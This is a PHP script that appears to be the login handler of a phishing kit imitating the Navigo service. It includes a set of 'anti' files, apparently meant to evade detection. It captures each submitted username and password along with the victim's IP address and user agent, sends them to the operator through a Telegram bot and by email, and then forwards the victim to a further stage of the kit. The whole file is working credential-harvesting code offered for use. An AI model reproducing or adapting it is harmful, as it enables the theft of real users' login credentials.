<?php

include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
include('../ab.php');
include '../config.php';
include '../functions.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

    if ($_SERVER["REQUEST_METHOD"] == "POST")
    {
        if(!empty($_POST["username"]) AND !empty($_POST["password"]))
        {
            $message="DATE: " . date("Y/m/d") . ' à ' . date("H:i:s") . "\n";
            $message.="[🔑]NAVIGO==LOG[🔑]\n";
            $message.="[🌐]ip:". _ip(). "\n";
            $message.="[💸]EMAIL:". $_POST['username']. "\n";
            $message.="[💸]PASS:". $_POST['password']. "\n";
            $message.="=================". "\n";
            $message.="[💣]USER AGENT: " . $_SERVER['HTTP_USER_AGENT']. "\n";


            if($rezParTelegram)
            {
                telegram_send(urlencode($message), $api_key, $chat_id);
            }
            if($rezParMail)
                $mail=mail($my_mail,$Subject,$message,$head);  

            header('Location: ../redirect/info.php');
        }
        else
        {
            header('Location: ../redirect/login.php');
        } 
        
    }


?>
